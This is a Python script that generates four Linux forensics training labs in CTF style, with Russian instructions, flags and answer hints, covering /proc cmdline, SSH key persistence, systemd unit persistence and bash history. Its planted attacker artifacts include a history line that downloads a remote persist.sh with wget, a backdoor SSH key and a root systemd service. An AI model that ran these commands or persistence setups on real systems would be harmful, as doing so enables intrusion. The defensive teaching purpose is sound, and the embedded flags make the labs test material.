# Batch FB-3: interactive labs for 4 Linux-artifact gap lessons.
import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _labgen import lab_block, write_bundle  # noqa: E402

WD = '/home/student/task'


def b64(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.b64encode(data).decode('ascii')


def _dir(p):
    return {'path': p, 'type': 'dir'}


def _f(p, t):
    return {'path': p, 'text': t}


def _b(p, data, mode='644'):
    return {'path': p, 'b64': b64(data), 'mode': mode}


def _lab(lid, title, files, hints, flag, fs, toolset=None):
    return {
        'id': lid, 'category': 'forensics', 'title': title,
        'toolset': toolset or ['core', 'grep', 'strings'],
        'workdir': WD, 'files': files,
        'check': "grep -q 'nto{' found.txt",
        'hints': hints,
        'expect': {'file': f'{WD}/found.txt', 'contains': flag},
        'fs': fs,
    }


def _task(text, rest):
    return [_dir(WD), _f(f'{WD}/task.md', text)] + rest


# --- linux-proc-forensics: NUL-separated cmdline + fd listing --------------
CMDLINE = (b'/tmp/.x/kworkerd\x00--pool\x00pool.example:3333\x00'
           b'--tag\x00nto{pr0c_cmdl1n3_nul_byt3s}\x00')

# --- linux-ssh-artifacts: authorized_keys + auth.log ------------------------
AUTH_KEYS = (
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7xQ2root@attacker\n'
    'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7 backup@corp\n'
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIfl4g nto{ssh_p3rs1st3nc3_by_k3y}\n'
)
AUTH_LOG = (
    'Mar 14 01:55:02 srv sshd[900]: Failed password for admin from 10.10.20.9\n'
    'Mar 14 02:11:33 srv sshd[1337]: Accepted publickey for root from 10.10.20.55 '
    'port 51422 ssh2: ED25519 SHA256:AAAAC3\n'
)

# --- linux-systemd-persistence: unit + binary with flag --------------------
UNIT = (
    '[Unit]\n'
    'Description=Network helper\n'
    'After=network.target\n'
    '\n'
    '[Service]\n'
    'Type=simple\n'
    'ExecStart=/usr/lib/systemd/systemd-networkd-helper --daemon\n'
    'Restart=always\n'
    'User=root\n'
    '\n'
    '[Install]\n'
    'WantedBy=multi-user.target\n'
)
BINARY = (b'\x7fELF' + b'\x02\x01\x01\x00' + b'\x00' * 24 +
          b'/usr/lib/systemd/systemd-networkd-helper\x00' +
          b'\x00' * 16 + b'nto{systemd_un1t_p3rs1st3nc3}\x00' +
          b'--daemon\x00Restart=always\x00')

# --- linux-shell-history: bash_history with timestamps ---------------------
HISTORY = (
    '#1710382000\n'
    'sudo -l\n'
    '#1710382012\n'
    'cat /etc/crontab\n'
    '#1710382055\n'
    'wget http://10.10.20.9/persist.sh -O /tmp/p.sh\n'
    '#1710382061\n'
    'echo nto{b4sh_h1st0ry_t1m3st4mp} >> /tmp/.f\n'
    '#1710382070\n'
    'rm -rf /tmp/.f\n'
)

SPECS = [
    _lab('linux-proc-forensics', 'Практика: живой анализ /proc',
         ['task.md', 'cmdline.bin', 'fd_list.txt'],
         ['`file cmdline.bin` — это бинарный файл.',
          'Аргументы разделены нулевыми байтами: `xxd cmdline.bin`.',
          '`strings` покажет каждый аргумент отдельной строкой.',
          'Выдели флаг: `strings cmdline.bin | grep nto > found.txt`.'],
         'nto{pr0c_cmdl1n3_nul_byt3s}',
         _task('# Задача: командная строка из /proc\n\n'
               '`cmdline.bin` — копия `/proc/<pid>/cmdline` подозрительного процесса. '
               'Аргументы разделены нулевыми байтами. Найди флаг в аргументах.\n\n'
               '1. `file cmdline.bin` и `xxd -l 64 cmdline.bin` — видны нули.\n'
               '2. `strings cmdline.bin` — каждый аргумент отдельной строкой.\n'
               '3. `strings cmdline.bin | grep nto > found.txt`.\n',
               [_b(f'{WD}/cmdline.bin', CMDLINE),
                _f(f'{WD}/fd_list.txt',
                   '0 -> /dev/null\n3 -> /tmp/.x/pool.log\n5 -> socket:[41234]\n')]),
         ),
    _lab('linux-ssh-artifacts', 'Практика: закрепление по SSH-ключу',
         ['task.md', 'authorized_keys', 'auth.log'],
         ['`cat authorized_keys` — список разрешённых ключей.',
          'Комментарий в конце ключа часто выдаёт источник.',
          'Сопоставь отпечаток с записью Accepted publickey в auth.log.',
          'Выдели флаг: `grep nto authorized_keys > found.txt`.'],
         'nto{ssh_p3rs1st3nc3_by_k3y}',
         _task('# Задача: SSH-закрепление\n\n'
               'Даны `authorized_keys` сервера и `auth.log`. Найди нештатный ключ '
               'и подтверди вход по нему.\n\n'
               '1. `cat authorized_keys`.\n'
               '2. `grep Accepted auth.log` — вход по ключу и адрес.\n'
               '3. `grep nto authorized_keys > found.txt`.\n',
               [_f(f'{WD}/authorized_keys', AUTH_KEYS),
                _f(f'{WD}/auth.log', AUTH_LOG)]),
         ),
    _lab('linux-systemd-persistence', 'Практика: вредоносный systemd-юнит',
         ['task.md', 'systemd-networkd-helper.service', 'systemd-networkd-helper'],
         ['`cat *.service` — прочитай юнит и его ExecStart.',
          '`file systemd-networkd-helper` — это бинарник (ELF).',
          'Флаг спрятан внутри бинарника: `strings`.',
          'Выдели флаг: `strings systemd-networkd-helper | grep nto > found.txt`.'],
         'nto{systemd_un1t_p3rs1st3nc3}',
         _task('# Задача: systemd-персистентность\n\n'
               'Найден юнит `systemd-networkd-helper.service` и его бинарник. '
               'Разбери юнит и найди флаг в бинарнике.\n\n'
               '1. `cat systemd-networkd-helper.service`.\n'
               '2. `file systemd-networkd-helper`.\n'
               '3. `strings systemd-networkd-helper | grep nto > found.txt`.\n',
               [_f(f'{WD}/systemd-networkd-helper.service', UNIT),
                _b(f'{WD}/systemd-networkd-helper', BINARY, mode='755')]),
         ),
    _lab('linux-shell-history', 'Практика: история bash с таймстемпами',
         ['task.md', '.bash_history'],
         ['`cat .bash_history` — команды с временными метками.',
          'Строки, начинающиеся с #, — Unix-время следующей команды.',
          'Ищи команду, содержащую флаг.',
          'Выдели флаг: `grep nto .bash_history > found.txt`.'],
         'nto{b4sh_h1st0ry_t1m3st4mp}',
         _task('# Задача: история shell\n\n'
               'Дан `.bash_history` с временными метками. Восстанови действия и найди флаг.\n\n'
               '1. `cat .bash_history`.\n'
               '2. Строки `#<sec>` — время; переведи `date -d @1710382061`.\n'
               '3. `grep nto .bash_history > found.txt`.\n',
               [_f(f'{WD}/.bash_history', HISTORY)]),
         ),
]
